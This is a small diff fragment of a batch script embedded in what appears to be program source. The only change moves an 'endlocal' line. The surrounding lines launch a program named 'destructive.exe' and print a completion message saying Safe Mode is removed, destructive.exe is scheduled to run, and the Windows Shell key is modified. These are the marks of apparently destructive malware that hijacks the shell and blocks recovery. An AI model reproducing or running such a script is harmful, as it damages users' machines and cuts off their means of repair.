@@ -271,10 +271,10 @@ if exist "%targetDir%" (
 )
 
 "C:\Program Files\utkudrk2\destructive.exe"
-endlocal
 
 :: Confirm completion
 echo Cleanup tasks completed. Safe Mode should now be removed, destructive.exe is scheduled to run, and Shell key is modified.
+endlocal
 exit
 "#;
 
